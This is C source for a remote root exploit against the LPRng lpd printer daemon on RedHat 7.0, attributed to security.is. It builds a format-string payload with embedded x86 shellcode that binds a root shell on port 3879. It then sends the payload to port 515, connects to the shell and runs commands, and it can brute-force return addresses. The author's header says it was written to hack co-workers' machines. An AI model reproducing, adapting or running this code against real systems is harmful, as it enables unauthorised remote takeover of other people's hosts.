/*
 *  Copyright (c) 2000 - Security.is
 *
 *  The following material may be freely redistributed, provided
 *  that the code or the disclaimer have not been partly removed,
 *  altered or modified in any way. The material is the property
 *  of security.is. You are allowed to adopt the represented code
 *  in your programs, given that you give credits where it's due.
 *
 * security.is presents: LPRng/Linux remote root lpd exploit.
 * 
 * Author: DiGiT - teddi@linux.is
 * 
 * Thanks to: portal for elite formatstring talent ;>
 * Greets to: security.is, #!ADM
 * 
 * Wrote it because I wanted to hack my co-workers machines ;>
 *
 * Run: ./SEClpd victim brute -t type  
 * Try first ./SEClpd victim -t 0 then try the brute. 
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define ADDRESS_BUFFER_SIZE   32+4
#define APPEND_BUFFER_SIZE    52
#define FORMAT_LENGTH         512-8
#define NOPCOUNT              200
#define SHELLCODE_COUNT       1030
#define DELAY                 50000 /* usecs */ 
#define OFFSET_LIMIT          5000

char shellcode[] = 

  "\x31\xdb\x31\xc9\x31\xc0\xb0\x46\xcd\x80"
  "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
  "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
  "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
  "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
  "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
  "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
  "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
  "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";


        
struct target
 {
  char *os_name;
  u_long eip_address;
  u_long shellcode_address;
  unsigned int position;
  int written_bytes;
  int align;
};

struct target targets[] =
 {
  { "RedHat 7.0 - Guinesss    ", 0xbffff3ec, 0L, 300, 70, 2,         },
  { "RedHat 7.0 - Guinesss-dev", 0xbffff12c, 0L, 300, 70, 2,         },
   {
     NULL, 0L, 0L, 0, 0, 0
  }
};


static char address_buffer[ADDRESS_BUFFER_SIZE+1];
static char append_buffer[APPEND_BUFFER_SIZE+1];
static char shellcode_buffer[1024];
static char *hostname=NULL;
static int offset;
static struct hostent *he;
int type=-1;
int brute=-1, failure=1;

void calculate_rets(u_long eip_addr, u_long shellcode_addr, u_int previous, u_int addr_loc)
{
   int i;
   unsigned int tmp = 0;
   unsigned int copied = previous;
   unsigned int num[4] =
   {
      (unsigned int) (shellcode_addr & 0x000000ff),
      (unsigned int)((shellcode_addr & 0x0000ff00) >> 8),
      (unsigned int)((shellcode_addr & 0x00ff0000) >> 16),
      (unsigned int)((shellcode_addr & 0xff000000) >> 24)
   };

   memset (address_buffer, '\0', sizeof(address_buffer));
   memset (append_buffer, '\0', sizeof(append_buffer));

   for (i = 0; i < 4; i++)
   {
      while (copied > 0x100)
         copied -= 0x100;

      if ( (i > 0) && (num[i-1] == num[i]) )
         sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);
      else if (copied < num[i])
      {
         if ( (num[i] - copied) <= 10)
         {
            sprintf (append_buffer+strlen(append_buffer), "%.*s",
               (int)(num[i] - copied), "security.is!");
            copied += (num[i] - copied);
            sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);         } else {
            sprintf (append_buffer+strlen(append_buffer), "%%.%du",
               num[i] - copied);
            copied += (num[i] - copied);
            sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);         }
      } else {
         tmp = ((num[i] + 0x100) - copied);
         sprintf (append_buffer+strlen(append_buffer), "%%.%du", tmp);
         copied += ((num[i] + 0x100) - copied);
         sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);
      }
     
      sprintf (address_buffer+strlen(address_buffer), "%c%c%c%c",
         (unsigned char) ((eip_addr+i) & 0x000000ff),
         (unsigned char)(((eip_addr+i) & 0x0000ff00) >> 8),
         (unsigned char)(((eip_addr+i) & 0x00ff0000) >> 16),
         (unsigned char)(((eip_addr+i) & 0xff000000) >> 24));
   }

   while (strlen(address_buffer) < ADDRESS_BUFFER_SIZE)
      strcat (address_buffer, "X");


#ifdef DEBUG
   printf ("\nGeneration complete:\nAddress: ");
   for (i = 0; i < strlen(address_buffer); i++)
   {
      if ( ((i % 4) == 0) && (i > 0) )
         printf (".");
      printf ("%02x", (unsigned char)address_buffer[i]);
   }
   printf ("\nAppend: %s\n", append_buffer);
#endif

   return;
}

char *create_malicious_string(void)
{
   static char format_buffer[FORMAT_LENGTH+1];
   long addr1,addr2;
   int i;

   memset (format_buffer, '\0', sizeof(format_buffer));

        targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;

        addr1 = targets[type].eip_address;
        addr2 = targets[type].shellcode_address;
  calculate_rets (addr1, addr2,targets[type].written_bytes, targets[type].position);
   
   (void)snprintf (format_buffer, sizeof(format_buffer)-1, "%.*s%s",
                   targets[type].align, "BBBB", address_buffer);

   strncpy (address_buffer, format_buffer, sizeof(address_buffer)-1);
   strncpy (format_buffer, append_buffer, sizeof(format_buffer)-1);
        
   for(i = 0 ; i < NOPCOUNT ; i++) 
   strcat(format_buffer, "\x90");

strcat(format_buffer, shellcode);

   return (format_buffer);
}

int connect_victim()
{

   int sockfd, n;
   struct sockaddr_in s;
   fd_set fd_stat;
   char buff[1024]; 

  static char testcmd[256] = "/bin/uname -a ; id ;\r\n";
  
   s.sin_family = AF_INET;
   s.sin_port = htons (3879);
   s.sin_addr.s_addr = *(u_long *)he->h_addr;


   if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
     {
       printf ("--- [5] Unable to create socket!\n");
       printf("Exploit failed!\n");
       return -1;
     }

   if ((connect (sockfd, (struct sockaddr *) &s, sizeof (s))) < 0)
     {
       return -1;
     }

     if(brute)

        printf("+++ The eip_address is 0x%x\n\n", targets[type].eip_address);
   
     printf("-   [+] shell located on %s\n", hostname);
     printf("-   [+] Enter Commands at will\n\n");

 failure = -1;

 FD_ZERO(&fd_stat);
 FD_SET(sockfd, &fd_stat);
 send(sockfd, testcmd, strlen(testcmd), 0);

 while(1) {

  FD_SET(sockfd,&fd_stat);
  FD_SET(0,&fd_stat);

  if(select(sockfd+1,&fd_stat,NULL,NULL,NULL)<0) break;
  if( FD_ISSET(sockfd, &fd_stat) ) {
   if((n=read(sockfd,buff,sizeof(buff)))<0){
     fprintf(stderr, "EOF\n");
     return 2;
   }

   if(write(1,buff,n)<0)break;
  }
  if ( FD_ISSET(0, &fd_stat) ) {
    if((n=read(0,buff,sizeof(buff)))<0){
      fprintf(stderr,"EOF\n");
      return 2;
    }

    if(send(sockfd,buff,n,0)<0) break;

   }
  }
}


void send_code(char *exploit_buffer)
{

   int sockfd, n;
   struct sockaddr_in s;
   fd_set fd_stat;
   char recv[1024];
   static char testcmd[256] = "/bin/uname -a ; id ;\r\n";
 
   s.sin_family = AF_INET;
   s.sin_port = htons (515);
   s.sin_addr.s_addr = *(u_long *)he->h_addr;



   if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
     {
       printf ("--- [5] Unable to create socket!\n");
       printf("Exploit failed!\n");
       exit(-1);
     }

   if ((connect (sockfd, (struct sockaddr *) &s, sizeof (s))) < 0)
     {
       printf ("--- [5] Unable to connect to %s\n", hostname);
       printf("Exploit failed, %s is not running LPD!\n", hostname);
       exit(-1);
     }


        usleep(DELAY);
        
        if(write (sockfd, exploit_buffer, strlen(exploit_buffer)) < 0)
          {
             printf ("Couldn't write to socket %d", sockfd);
             printf ("Exploit failed\n");
             exit(2);
         }

        close(sockfd);
        connect_victim();

   }




void usage(char *program)
{

 int i=0;

   printf("SEClpd by DiGiT of ADM/security.is ! \n\n");
   printf("Usage: %s victim [\"brute\"] -t type [-o offset] [-a align] [-p position] [-r eip_addr] [-c shell_addr]
[-w written_bytes] \n\n", program);
   printf("ie: ./SEClpd localhost -t 0 For most redhat 7.0 boxes\n");
   printf("ie: ./SEClpd localhost brute -t 0 For brute forcing all redhat 7.0 boxes\n");
   printf("Types:\n\n");

   while( targets[i].os_name != NULL)
      printf ("[ Type %d:  [ %s ]\n", i++, targets[i].os_name);
}

int main(int argc, char **argv)
{
 
   char exploit_buffer[1024];
   char *format = NULL;
   int c, brutecount=0;



if(argc < 3)
  {
    usage(argv[0]);
    return 1;
 }

      hostname = argv[1];

if(!strncmp(argv[2], "brute", 5)) brute = 1;

   
      while(( c = getopt (argc, argv, "t:r:c:a:o:p:w:k"))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;
      
         case 'r':
            targets[type].eip_address = strtoul(optarg, NULL, 16);
            break;

         case 'c':
            targets[type].shellcode_address = strtoul(optarg, NULL, 16);
            break;

         case 'a':
            targets[type].align = atoi(optarg);
            break;

         case 'o':
            offset = atoi(optarg);
            break;

         case 'p':
            targets[type].position = atoi(optarg);
            break;

         case 'w':
            targets[type].written_bytes = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }

       if(type < 0) 
         {
           printf("You must specify a type!\n");
           printf("example: ./SEClpd victim -t 0\n");
           return -1;
        }

   if ( (he = gethostbyname (hostname)) == NULL)
   {
     herror("gethostbyname");
     exit(1);
   }

  targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;

   
   printf("+++ Security.is remote exploit for LPRng/lpd by DiGiT\n\n");   

   printf("+++ Exploit information\n");
   printf("+++ Victim: %s\n", hostname);
   printf("+++ Type: %d - %s\n", type, targets[type].os_name);  
   printf("+++ Eip address: 0x%x\n", targets[type].eip_address); 
   printf("+++ Shellcode address: 0x%x\n", targets[type].shellcode_address); 
   printf("+++ Position: %d\n", targets[type].position);
   printf("+++ Alignment: %d\n", targets[type].align);
   printf("+++ Offset %d\n", offset);
   printf("\n");

   printf("+++ Attacking %s with our format string\n", hostname);

if( brute > 0 )
 {

  printf("+++ Brute force man, relax and enjoy the ride ;>\n");
   targets[type].eip_address =  0xbffffff0;

 while(failure) 
 
  {
        memset(exploit_buffer, '\0', sizeof(exploit_buffer)); 

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, "\n");
   send_code(exploit_buffer);

        targets[type].eip_address = 0xbffffff0 - offset;

  offset+=4;

    if (offset > OFFSET_LIMIT) {
        printf("+++ Offset limit hit, ending brute mode ;<\n");
        return -1;

       }
    }
}


else

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, "\n");
   send_code(exploit_buffer);

        printf("Argh exploit failed$#%! try brute force!\n"); 

   return (-1);
}